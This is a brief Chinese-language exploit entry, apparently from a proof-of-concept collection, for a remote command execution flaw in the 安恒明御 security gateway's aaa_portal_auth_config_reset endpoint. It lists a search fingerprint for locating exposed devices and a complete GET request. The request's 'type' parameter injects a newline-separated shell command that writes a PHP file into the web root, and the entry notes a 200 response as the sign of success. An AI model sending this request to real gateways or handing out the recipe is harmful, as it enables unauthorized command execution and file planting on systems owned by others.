# 安恒明御安全网关aaa_portal_auth_config_reset远程命令执行漏洞

安恒明御安全网关aaa_portal_auth_config_reset ｜ 命令执行 ｜ —
- **指纹**：`title="明御安全网关"`
- **请求**：`GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22dudesuite%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2Fdudesuite.php%0a HTTP/1.1`
- **响应特征**：200